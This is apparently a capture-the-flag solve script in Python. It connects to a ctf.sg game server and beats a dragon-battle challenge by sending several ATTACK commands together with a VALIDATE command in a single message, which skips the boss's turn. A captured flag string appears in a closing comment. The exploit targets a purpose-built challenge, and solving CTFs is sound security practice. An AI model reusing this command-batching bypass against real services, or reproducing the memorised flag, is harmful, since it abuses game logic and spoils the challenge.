#!/usr/bin/env python3

from typing import Any

from nclib import Netcat  # type: ignore

from core.networking.protocol import EOF_MARKER, decode, encode


class NetClient:
    def __init__(self, host: str, port: int, verbose: bool = False):
        self.__client = Netcat((host, port), verbose=verbose)

    def send(self, command):
        return self._send_raw(command.value)

    def _send_raw(self, data: str) -> int:
        return self.__client.send(encode(data))

    def recv(
        self,
        marker: str = EOF_MARKER,
        max_size: Any | None = None,
        timeout: str = "default",
    ) -> str:
        return decode(
            self.__client.recv_until(marker, max_size, timeout)[
                : -len(EOF_MARKER)
            ]
        )

    def close(self):
        self.__client.close()



if __name__ == "__main__":
    from core.models import Command

    # Connection to server
    con = NetClient("chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg", 18261)

    BOSS_HPS = (5, 30, 100)
    for i in BOSS_HPS:
        con.send(Command.BATTLE)  # Start battle
        con.recv()    # Receive boss info

        # Attack "i" number of times
        # Add VALIDATE command to bypass BOSS_ATTACK command
        data = " ".join([Command.ATTACK.value]*i + [Command.VALIDATE.value])
        con._send_raw(data)  # Send attack payload
        con.recv()    # Receive VALIDATE_OK/FLAG_OBTAINED

    flag = con.recv()  # Get flag!

    con.close()  # Close connection cause why not :)

    # Success message (and flag!)
    print(f"You have slain the dragon!\nFlag captured:\n{flag}")

# Flag Captured:
# TISC{L3T5_M33T_4G41N_1N_500_Y34R5_96eef57b46a6db572c08eef5f1924bc3}
